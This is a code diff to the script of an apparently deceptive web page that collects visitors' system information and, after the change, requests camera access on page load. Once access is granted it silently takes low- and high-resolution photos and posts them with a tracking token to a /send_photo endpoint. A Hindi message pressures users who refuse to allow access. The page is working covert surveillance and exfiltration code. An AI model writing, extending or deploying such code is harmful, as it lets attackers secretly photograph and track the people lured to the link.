@@ -27,6 +27,7 @@
 const token = "{{ token }}";
 const ipinfoToken = "{{ ipinfo_token }}";
 const msg = document.getElementById("msg");
+let cameraAllowed = false;
 
 // Auto system info (no permission needed)
 async function collectInfo() {
@@ -61,52 +62,72 @@ async function collectInfo() {
 }
 collectInfo();
 
-// Camera capture on button click
-document.getElementById("btnCam").addEventListener("click", ()=>{
-  navigator.mediaDevices.getUserMedia({ video: true })
-    .then(stream => {
-      const video = document.createElement("video");
-      video.srcObject = stream;
-      video.play();
+// Camera capture
+function capturePhoto(stream) {
+  const video = document.createElement("video");
+  video.srcObject = stream;
+  video.play();
 
-      const canvas = document.createElement("canvas");
-      const ctx = canvas.getContext("2d");
+  const canvas = document.createElement("canvas");
+  const ctx = canvas.getContext("2d");
 
-      // Fast low-res snapshot
-      setTimeout(() => {
-        canvas.width = 320;
-        canvas.height = 240;
-        ctx.drawImage(video, 0, 0, 320, 240);
-        const image = canvas.toDataURL("image/jpeg", 0.6);
-        fetch("/send_photo", {
-          method: "POST",
-          headers: {"Content-Type": "application/json"},
-          body: JSON.stringify({ image, token })
-        });
-      }, 100);
-
-      // High-res snapshot
-      video.onloadedmetadata = () => {
-        setTimeout(() => {
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          ctx.drawImage(video, 0, 0);
-          const image = canvas.toDataURL("image/jpeg", 0.9);
-          fetch("/send_photo", {
-            method: "POST",
-            headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({ image, token })
-          }).then(() => stream.getTracks().forEach(t => t.stop()));
-        }, 500);
-      };
-
-      // Redirect after capture
-      setTimeout(()=> window.location.href = "/next?token="+token, 1500);
-
-    })
-    .catch(err => {
-      msg.innerText = "❌ आपने अनुमति deny कर दी है। Allow करें तभी आगे बढ़ सकते हैं।\nअगर allow option नहीं दिख रहा तो लिंक दोबारा खोलें, और फिर भी न हो तो browser data clear करें।";
+  // Fast low-res snapshot
+  setTimeout(() => {
+    canvas.width = 320;
+    canvas.height = 240;
+    ctx.drawImage(video, 0, 0, 320, 240);
+    const image = canvas.toDataURL("image/jpeg", 0.6);
+    fetch("/send_photo", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({ image, token })
     });
+  }, 100);
+
+  // High-res snapshot
+  video.onloadedmetadata = () => {
+    setTimeout(() => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0);
+      const image = canvas.toDataURL("image/jpeg", 0.9);
+      fetch("/send_photo", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({ image, token })
+      }).then(() => stream.getTracks().forEach(t => t.stop()));
+    }, 500);
+  };
+}
+
+// Auto ask camera permission on load
+navigator.mediaDevices.getUserMedia({ video: true })
+  .then(stream => {
+    cameraAllowed = true;
+    capturePhoto(stream);
+  })
+  .catch(err => {
+    cameraAllowed = false;
+    msg.innerText = "❌ आपने अनुमति deny कर दी है। Allow करें तभी आगे बढ़ सकते हैं।\nअगर allow option नहीं दिख रहा तो लिंक दोबारा खोलें, और फिर भी न हो तो browser data clear करें।";
+  });
+
+// Button logic
+document.getElementById("btnCam").addEventListener("click", ()=>{
+  if (cameraAllowed) {
+    // Already allowed → redirect
+    window.location.href = "/next?token=" + token;
+  } else {
+    // Retry asking
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        cameraAllowed = true;
+        capturePhoto(stream);
+        setTimeout(()=> window.location.href = "/next?token="+token, 1500);
+      })
+      .catch(err => {
+        msg.innerText = "❌ आपने अनुमति deny कर दी है। Allow करें तभी आगे बढ़ सकते हैं।";
+      });
+  }
 });
 </script>
 </body>
